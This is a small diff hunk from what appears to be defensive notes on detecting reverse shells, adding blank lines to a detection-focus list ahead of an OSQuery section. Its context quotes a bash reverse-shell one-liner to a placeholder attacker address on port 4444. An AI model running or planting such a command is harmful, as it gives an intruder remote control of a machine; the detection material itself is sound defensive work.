@@ -81,7 +81,9 @@ Example reverse shell command used by attacker:
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
 Detection Focus-
+
 Suspicious processes
+
 Unusual network connections
 
 OSQuery Detection Query-
